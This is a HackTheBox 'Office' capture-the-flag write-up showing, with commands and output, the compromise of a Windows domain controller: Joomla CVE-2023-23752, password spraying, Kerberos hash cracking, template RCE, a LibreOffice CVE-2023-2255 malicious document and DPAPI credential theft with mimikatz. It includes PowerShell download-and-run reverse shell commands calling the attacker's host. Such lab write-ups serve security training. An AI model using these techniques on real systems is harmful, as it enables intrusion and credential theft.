---
layout: writeup
category: HTB
description: Office is a Hard Windows machine in which we have to do the following things. First, we have a Joomla web vulnerable to a [unauthenticated information disclosure](https://github.com/Acceis/exploit-CVE-2023-23752) that later will give us access to SMB with user dwolfe that we enumerated before with kerbrute. In this SMB access, we have a "SOC Analysis" share that we have access which has a pcap file in which we can see a krb5 hash for user tstark. This hash is crackable and we can login into joomla to later modify a template and gain access as web_account. Then, we can see user.txt by executing a command as user tstark with the password cracked before using RunasCs. Next, it's possible to gain access as user ppotts by using a internal web and upload a .odt file crafted to exploit CVE-2023-2255 of LibreOffice. Consequently, we can see some DPAPI credentials that when decrypted with mimikatz, it reveals password for hhogan. Finally, in bloodhound we can see that a group which hhogan belongs can modify the Group Policy and consequently add himself to administrators group.
points: 40
solves: 1554
tags: joomla-information-disclosure CVE-2023-23752 smb-enumeration pcap-tcp-packet-analysis wireshark krb-hash joomla-rce runascs password-reuse port-forwading libreoffice-odt-exploitation CVE-2023-2255 dpapi-creds mimikatz bloodhound modifying-group-policy
date: 2024-06-21
title: HTB Office writeup
comments: false
---

Office is a Hard Windows machine in which we have to do the following things. First, we have a Joomla web vulnerable to a [unauthenticated information disclosure](https://github.com/Acceis/exploit-CVE-2023-23752) that later will give us access to SMB with user dwolfe that we enumerated before with kerbrute. In this SMB access, we have a "SOC Analysis" share that we have access which has a pcap file in which we can see a krb5 hash for user tstark. This hash is crackable and we can login into joomla to later modify a template and gain access as web_account. Then, we can see user.txt by executing a command as user tstark with the password cracked before using RunasCs. Next, it's possible to gain access as user ppotts by using a internal web and upload a .odt file crafted to exploit CVE-2023-2255 of LibreOffice. Consequently, we can see some DPAPI credentials that when decrypted with mimikatz, it reveals password for hhogan. Finally, in bloodhound we can see that a group which hhogan belongs can modify the Group Policy and consequently add himself to administrators group.

# Enumeration

## Port scanning

I will start with a basic TCP port scanning with nmap to see which ports are open and see which services are running:

```bash
❯ sudo nmap -p- --open -sS -sVC --min-rate 5000 -v -n -Pn 10.10.11.3
# Nmap 7.94SVN scan initiated Thu Apr 18 21:51:12 2024 as: nmap -sVC -p- --open -sS --min-rate 5000 -v -n -Pn -oN tcpTargeted 10.10.11.3
Nmap scan report for 10.10.11.3
Host is up (0.11s latency).
Not shown: 65517 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 1B6942E22443109DAEA739524AB74123
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-robots.txt: 16 disallowed entries (15 shown)
| /joomla/administrator/ /administrator/ /api/ /bin/ 
| /cache/ /cli/ /components/ /includes/ /installation/ 
|_/language/ /layouts/ /libraries/ /logs/ /modules/ /plugins/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-04-19 03:51:44Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
443/tcp   open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
|_http-title: 403 Forbidden
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: office.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.office.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.office.htb
| Issuer: commonName=office-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-05-10T12:36:58
| Not valid after:  2024-05-09T12:36:58
| MD5:   b83f:ab78:db28:734d:de84:11e9:420f:8878
|_SHA-1: 36c4:cedf:9185:3d4c:598c:739a:8bc7:a062:4458:cfe4
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
65511/tcp open  msrpc         Microsoft Windows RPC
Service Info: Hosts: DC, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-04-19T03:52:36
|_  start_date: N/A
|_clock-skew: 7h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Apr 18 21:53:17 2024 -- 1 IP address (1 host up) scanned in 125.46 seconds
```

* -sVC: Identifies service and version.
* -p-: scans all the range of ports (1-65535).
* --open: shows only open ports and not filtered or closed.
* -sS: TCP SYN scan that improves velocity because it doesn't establish the connection.
* --min-rate 5000: Sends 5000 packets per second to improve velocity (don't do this in a 
real environment).
* -n: Disables DNS resolution protocol.
* -v: Enables verbose to see which ports are opened while it's scanning
* -Pn: Disables host discovery protocol (ping).
* -oN targeted: Exports the evidence to a file named "tcpTargeted".

We see a lot of ports for active directory and a web service. I will start with active directory.

## Active directory enumeration

Starting with SMB, we can see that is a Windows Server 2022 with office.htb as domain and we don't have guest or null session access:

```bash
❯ netexec smb 10.10.11.3
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
```
```bash
❯ smbmap --no-banner -H 10.10.11.3
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authentidated session(s)                                                      
❯ smbmap --no-banner -u "" -p "" -H 10.10.11.3
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authentidated session(s)                                                      
❯ smbmap -u "non_existing_username" -p "" -H 10.10.11.3
[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 0 authentidated session(s)
```
```bash
❯ smbclient -N -L \\\\10.10.11.3\\
session setup failed: NT_STATUS_ACCESS_DENIED
❯ smbclient -U "office.htb/%" -L \\\\10.10.11.3\\
session setup failed: NT_STATUS_LOGON_FAILURE
❯ smbclient -U "office.htb/non_existing_username%" -L \\\\10.10.11.3\\
session setup failed: NT_STATUS_LOGON_FAILURE
❯ smbclient -U "office.htb/guest%" -L \\\\10.10.11.3\\
session setup failed: NT_STATUS_ACCOUNT_DISABLED
```

For RPC we neither have access. But bruteforcing usernames with kerbrute for kerberos we can see a bunch of existing usernames in the DC:

```bash
❯ /opt/kerbrute/kerbrute userenum -d office.htb --dc office.htb /opt/SecLists/Usernames/xato-net-10-million-usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 06/18/24 - Ronnie Flathers @ropnop

2024/06/18 19:03:45 >  Using KDC(s):
2024/06/18 19:03:45 >  	office.htb:88

2024/06/18 19:04:09 >  [+] VALID USERNAME:	administrator@office.htb
2024/06/18 19:06:06 >  [+] VALID USERNAME:	Administrator@office.htb
2024/06/18 19:07:00 >  [+] VALID USERNAME:	ewhite@office.htb
2024/06/18 19:07:00 >  [+] VALID USERNAME:	etower@office.htb
2024/06/18 19:07:00 >  [+] VALID USERNAME:	dwolfe@office.htb
2024/06/18 19:07:00 >  [+] VALID USERNAME:	dmichael@office.htb
2024/06/18 19:07:00 >  [+] VALID USERNAME:	dlanor@office.htb
2024/06/18 19:30:42 >  [+] VALID USERNAME:	hhogan@office.htb
2024/06/18 19:38:32 >  [+] VALID USERNAME:	DWOLFE@office.htb
```

I'll grab these usernames to a file in case they are useful in the future:

```bash
❯ cat valid_users.txt
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: valid_users.txt
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ administrator
   2   │ Administrator
   3   │ ewhite
   4   │ etower
   5   │ dwolfe
   6   │ dmichael
   7   │ dlanor
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
Now, I'll go to enumerate the web (port 80 and port 443) to see what is out there.

## Web enumeration
            
Looking at the technologies used for http, we can see that it's using Joomla CMS, which is interesting:

```bash
❯ whatweb http://10.10.11.3
http://10.10.11.3 [200 OK] Apache[2.4.56], Cookies[3815f63d17a9109b26eb1b8c114159ac], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], HttpOnly[3815f63d17a9109b26eb1b8c114159ac], IP[10.10.11.3], MetaGenerator[Joomla! - Open Source Content Management], OpenSSL[1.1.1t], PHP[8.0.28], PasswordField[password], PoweredBy[the], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.0.28]
```

![HTTP joomla page](/assets/images/Office/main_http_page.png)

For https (443), we only have that it returns a 403 for the / page:

```bash
❯ whatweb https://10.10.11.3
https://10.10.11.3 [403 Forbidden] Apache[2.4.56], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28], IP[10.10.11.3], OpenSSL[1.1.1t], PHP[8.0.28], Title[403 Forbidden]
```

And fuzzing, we can see a `examples` directory that don't return nothing useful and a `joomla` direcotry that is the same page served on http, but it has a Web Authentication button (that is of no use):

```bash
❯ wfuzz -c -t 100 -w /opt/SecLists/Discovery/Web-Content/common.txt --hc=404,403 -u https://10.10.11.3/FUZZ
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.11.3/FUZZ
Total requests: 4727

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                
=====================================================================

000002348:   301        9 L      30 W       336 Ch      "joomla"                                                                                                               
000001714:   503        11 L     44 W       401 Ch      "examples"                                                                                                             

Total time: 5.203635
Processed Requests: 4727
Filtered Requests: 4725
Requests/sec.: 908.4033
```

![HTTPS Joomla page](/assets/images/Office/https_joomla_page.png)

Now that we see that it consists of a Joomla CMS, looking at the version using [this path](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version), we can see that it uses version 4.2.7:

![Version 4.2.7 on Joomla](/assets/images/Office/version-4.2.7-joomla.png)

Also, looking at [vulnerabilities for this version](https://www.cvedetails.com/version/1140587/Joomla-Joomla--4.2.7.html), we can see that it has a [unauthenticated information disclosure](https://www.cvedetails.com/cve/CVE-2023-23752/) which can give attackers access to plaintext credentials for the MySQL database. I will use [this exploit](https://github.com/Acceis/exploit-CVE-2023-23752) to exploit this vulnerability and we can see credentials belonging to user root for MySQL:

```bash
❯ git clone https://github.com/Acceis/exploit-CVE-2023-23752
Cloning into 'exploit-CVE-2023-23752'...
remote: Enumerating objects: 24, done.
remote: Counting objects: 100% (24/24), done.
remote: Compressing objects: 100% (20/20), done.
remote: Total 24 (delta 8), reused 15 (delta 3), pack-reused 0
Receiving objects: 100% (24/24), 75.33 KiB | 521.00 KiB/s, done.
Resolving deltas: 100% (8/8), done.
❯ cd exploit-CVE-2023-23752
❯ ruby exploit.rb
Usage:
  exploit.rb <url> [options]
  exploit.rb -h | --help
❯ ruby exploit.rb http://10.10.11.3
Users
[474] Tony Stark (Administrator) - Administrator@holography.htb - Super Users

Site info
Site name: Holography Industries
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: root
DB password: H0lOgrams4reTakIng0Ver754!
DB name: joomla_db
DB prefix: if2tx_
DB encryption 0
```

Trying to reuse these credentials doesn't work for Joomla in both http and https:

![Creds useless in joomla in HTTP](/assets/images/Office/creds-useless-in-joomla-http.png)
![Creds useless in joomla in HTTPS](/assets/images/Office/creds-useless-in-joomla-https.png)

# Access as web_account

Although we don't have access to Joomla, remember we had a valid list of users that we bruteforced with kerbrute. Using those to see which of them can authenticate with the password we grabed in Joomla vulnerability, we can see that we can login with user dwolfe for SMB:

```bash
❯ netexec smb 10.10.11.3 -u valid_users.txt -p 'H0lOgrams4reTakIng0Ver754!' --continue-on-success
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\Administrator:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\ewhite:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\etower:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [-] office.htb\dmichael:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE 
SMB         10.10.11.3      445    DC               [-] office.htb\dlanor:H0lOgrams4reTakIng0Ver754! STATUS_LOGON_FAILURE
```

Looking at the SMB shares available for this user, we can see `SOC Analysis` share that has a .pcap file that we can try to analyze:

```bash
❯ netexec smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [+] office.htb\dwolfe:H0lOgrams4reTakIng0Ver754! 
SMB         10.10.11.3      445    DC               [*] Enumerated shares
SMB         10.10.11.3      445    DC               Share           Permissions     Remark
SMB         10.10.11.3      445    DC               -----           -----------     ------
SMB         10.10.11.3      445    DC               ADMIN$                          Remote Admin
SMB         10.10.11.3      445    DC               C$                              Default share
SMB         10.10.11.3      445    DC               IPC$            READ            Remote IPC
SMB         10.10.11.3      445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.11.3      445    DC               SOC Analysis    READ            
SMB         10.10.11.3      445    DC               SYSVOL          READ            Logon server share 
❯ smbclient -U 'office.htb/dwolfe%H0lOgrams4reTakIng0Ver754!' \\\\10.10.11.3\\SOC\ Analysis
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed May 10 20:52:24 2023
  ..                                DHS        0  Wed Feb 14 11:18:31 2024
  Latest-System-Dump-8fbc124d.pcap      A  1372860  Mon May  8 02:59:00 2023

		6265599 blocks of size 4096. 1220795 blocks available
smb: \> get Latest-System-Dump-8fbc124d.pcap
getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (465.7 KiloBytes/sec) (average 465.7 KiloBytes/sec)
```

I have analyzed with wireshark this capture using the query below to quit the packets that use the protocol tls, dns, quic or arp (which are not useful in this context) and also to quit the packets that have for destination or source a IP that belongs to the internet (it's neither useful):

```plaintext
!tls and !dns and !quic and !arp and (ip.src !== 204.79.197.203 and ip.dst !== 204.79.197.203) and (ip.src !== 13.107.6.158 and ip.dst !== 13.107.6.158) and (ip.src !== 66.130.63.27 and ip.dst !== 66.130.63.27) and (ip.src !== 13.107.21.200 and ip.dst !== 13.107.21.200) and (ip.src !== 54.192.51.47 and ip.dst !== 54.192.51.47) and (ip.src !== 66.130.63.26 and ip.dst !== 66.130.63.26) and (ip.src !== 23.43.161.161 and ip.dst !== 23.43.161.161) and (ip.src !== 204.79.197.200 and ip.dst !== 204.79.197.200) and (ip.src !== 20.110.205.119 and ip.dst !== 20.110.205.119) and (ip.src !== 20.42.65.85 and ip.dst !== 20.42.65.85)
```

Something that caught my attention is this KRB5 AS-REQ package that have the hash for user tstark:

![Kerberos AS-REQ package](/assets/images/Office/kerberos-as-req-package.png)

Using [this guide](https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/), we are able to build the formatted hash for hashcat to crack it and we are able to return the password:

```bash
❯ cat tstark.hash
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: tstark.hash
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ hashcat -m 19900 tstark.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

$krb5pa$18$tstark$office.htb$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc:playboy69
                                                          
<SNIP>
```

This credential works for the administration panel of Joomla with user Administrator, that I will use to gain access to the machine as its said [here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce):

But first, we have to fire up a listener to receive the shell and a HTTP server for powershell to interpret [ConPtyShell](https://github.com/antonioCoco/ConPtyShell) that will give us a stable shell:

```bash
❯ ls Invoke-ConPtyShell.ps1
Invoke-ConPtyShell.ps1
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

Now modify the template and execute a powershell command to receive the shell:

![Editing template file in Joomla](/assets/images/Office/editing-template-file-joomla.png)

```bash
❯ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.67/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp 10.10.14.67 -RemotePort 443 -Rows 50 -Cols 184" | iconv -t utf16le | base64 -w 0; echo
```

> Note: You can view the necessary rows and columns for the command above in a entire window with command `stty size`. It's not recommended to split the terminal or change the size of the window when you have specified the rows and columns because it will look bad.

![Executing reverse shell](/assets/images/Office/executing-reverse-shell.png)

Now when you receive the shell, press ctrl+z, execute `stty raw -echo; fg` and do ctrl+l to have a completely interactive shell where you can do ctrl+c, have autocompletion, etc.

# Access as tstark

To have a shell as user tstark, I will spawn a nc listener and use [RunasCs](https://github.com/antonioCoco/RunasCs) in order to have the ability to execute commands as tstark and execute the same `powershell -enc <BASE64 PAYLOAD>` command as before:

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

```powershell
PS C:\Windows\Temp\privesc> .\RunasCs.exe tstark playboy69 "cmd /c powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYANwAvAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBoAGUAbABsAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAgAC0AUgBlAG0AbwB0AGUASQBwACAAMQAwAC4AMQAwAC4AMQA0AC4ANgA3ACAALQBSAGUAbQBvAHQAZQBQAG8AcgB0ACAANAA0ADMAIAAtAFIAbwB3AHMAIAA1ADAAIAAtAEMAbwBsAHMAIAAxADgANAA="
```

And we receive the shell as tstark and in consequence, see the flag:

```bash
PS C:\Windows\system32> cd C:\Users\tstark\Desktop>
PS C:\Users\tstark\Desktop> type .\user.txt
99****************************ad
```

> Note: Remember to do ctrl+z, execute `stty raw -echo; fg` and do ctrl+l

# Access as ppotts 

Looking the running services in localhost, I can see a http service running at port 8083. In order to see like which user I gain access, I will try to hack it. To perform this, I will forward the port to my machine using chisel:

**Attacker machine**
```bash
❯ ./chisel_linux server -p 1234 --reverse
2024/06/21 22:09:46 server: Reverse tunnelling enabled
2024/06/21 22:09:46 server: Fingerprint 4cdjcKyOUpJIP7F2Ztvw+6wJXGLHs6zisZvf11hcQlE=
2024/06/21 22:09:46 server: Listening on http://0.0.0.0:1234
```

**Victim machine**
```powershell
PS C:\Windows\Temp\privesc2> .\chisel_windows.exe client 10.10.14.67:1234 R:8083:127.0.0.1:8083
```

The only interesting feature in this webapp is the "Job Application Submission" located in `/resume.php` where I can upload a file:

![Job application submission feature in port 8083](/assets/images/Office/job-application-submission-:8083.png)

I will take advantage that I have access to the machine and inspect the code of the file `resume.php`. Searching for the file I can see that is located in `C:\xampp\htdocs\internal`:


```powershell
PS C:\> cmd /c dir /r /s "resume.php"
 Volume in drive C has no label.
 Volume Serial Number is C626-9388

 Directory of C:\xampp\htdocs\internal

01/30/2024  09:40 AM             5,282 resume.php
               1 File(s)          5,282 bytes

     Total Files Listed:
               1 File(s)          5,282 bytes
               0 Dir(s)   5,041,455,104 bytes free
```

so I will transfer it to my machine using SMB:

**Create SMB Server**

```bash
❯ smbserver.py -username test -password 'test123$!' share $(pwd) -smb2support
Impacket v0.12.0.dev1+20240411.142706.1bc283fb - Copyright 2023 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

**Use the SMB server and transfer resume.php**
```powershell
PS C:\> cd C:\xampp\htdocs\internal
PS C:\xampp\htdocs\internal> net use z: \\10.10.14.67\share /u:test 'test123$!'
The command completed successfully.

PS C:\xampp\htdocs\internal> copy .\resume.php z:
```

In this file, I can see that the only allowed extensions to upload are docm, docx, doc and odt:

![resume.php](/assets/images/Office/resume.php.png)

Also, I can see that the programs that can be used to open this documents are LibreOffice 5 and LibreOffice 4 (listing directories in both `C:\Program Files (x86)` and `C:\Program Files`), so I will craft a .odt exploit to upload it to the web taking advantage of [CVE-2023-2255 exploit](https://github.com/elweth-sec/CVE-2023-2255) suppossing that some user opens this document:

**HTTP server to share Invoke-ConPtyShell.ps1**
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

**nc listener to receive shell**
```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

**Craft the encoded command to execute with powershell**
```bash
❯ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.67/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp 10.10.14.67 -RemotePort 443 -Rows 50 -Cols 184" | iconv -t utf16le | base64 -w 0; echo
```

**Craft the .odt file to exploit LibreOffice and execute command**
```bash
❯ python3 CVE-2023-2255.py --cmd "cmd /c powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYANwAvAEkAbgB2AG8AawBlAC0AQwBvAG4AUAB0AHkAUwBoAGUAbABsAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAgAC0AUgBlAG0AbwB0AGUASQBwACAAMQAwAC4AMQAwAC4AMQA0AC4ANgA3ACAALQBSAGUAbQBvAHQAZQBQAG8AcgB0ACAANAA0ADMAIAAtAFIAbwB3AHMAIAA1ADAAIAAtAEMAbwBsAHMAIAAxADgANAA="
File output.odt has been created !
```

![Upload successfull](/assets/images/Office/upload_successful.png)

And we receive shell as ppotts:

```powershell
PS C:\Program Files\LibreOffice 5\program> whoami
office\ppotts
```

# Access as hhogan

Enumerating with winpeas, I can see some DPAPI credential files belonging to ppotts:

![Detected DPAPI credential files](/assets/images/Office/detected-dpapi-credential-files.png)

So uploading mimikatz and trying to see the credentials stored in those files following the steps described [here](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords#credential-files), I can see a password for hhogan:

```powershell
PS C:\Windows\Temp\privesc > .\mimikatz.exe "dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166" "exit"
mimikatz(commandline) # dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
**BLOB**

<SNIP>

Decrypting Credential:

<SNIP>

UserName       : OFFICE\HHogan
  CredentialBlob : H4ppyFtW183#
  Attributes     : 0

mimikatz(commandline) # exit
Bye!
```

> Note: The master key reported in each Credential file in winPEAS is the file in which we have to extract the real masterkey located in C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107. For example for Credential File C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials\18A1927A997A794B65E9849883AC3F3E, its said that its masterkey is 191d3f9d-7959-4b4d-a520-a444853c47eb, so we have to execute this command to extract the real masterkey for this credential file: `PS C:\Windows\Temp\privesc3> .\mimikatz.exe "dpapi::masterkey /in:C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" "exit" | findstr "key"` and the key we have to use in dpapi::cred is the one under [domainkey] with RPC.

We can see password 'H4ppyFtW183#' for user HHogan, and also he belongs to Remote Management Users (that means we can use evil-winrm into he):

```powershell
PS C:\Windows\Temp\privesc3> net user hhogan
User name                    HHogan
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            5/6/2023 11:59:34 AM
Password expires             Never
Password changeable          5/7/2023 11:59:34 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   5/10/2023 5:30:58 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Domain Users         *GPO Managers
The command completed successfully.
```

```bash
❯ evil-winrm -i 10.10.11.3 -u hhogan -p 'H4ppyFtW183#'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
